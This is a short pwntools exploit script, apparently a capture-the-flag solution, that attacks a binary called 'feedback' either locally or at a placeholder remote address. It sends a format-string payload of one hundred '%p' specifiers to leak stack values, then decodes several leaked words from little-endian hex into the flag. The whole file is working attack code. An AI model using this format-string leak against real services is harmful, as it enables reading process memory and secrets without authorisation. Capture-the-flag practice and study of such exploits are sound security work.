#!/usr/bin/env python3

from pwn import *

exe = ELF("./feedback")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    r.recv()
    r.sendline((b'%p '*100).strip())
    flag = r.recv()
    flag = flag.split(b' ')[21:27]

    to_byte = lambda x : bytes.fromhex(x[2:].decode().rjust(16,'0'))

    flag = b''.join([i[::-1] for i in [*map(to_byte,flag)]])
    log.info(flag.decode())

if __name__ == "__main__":
    main()
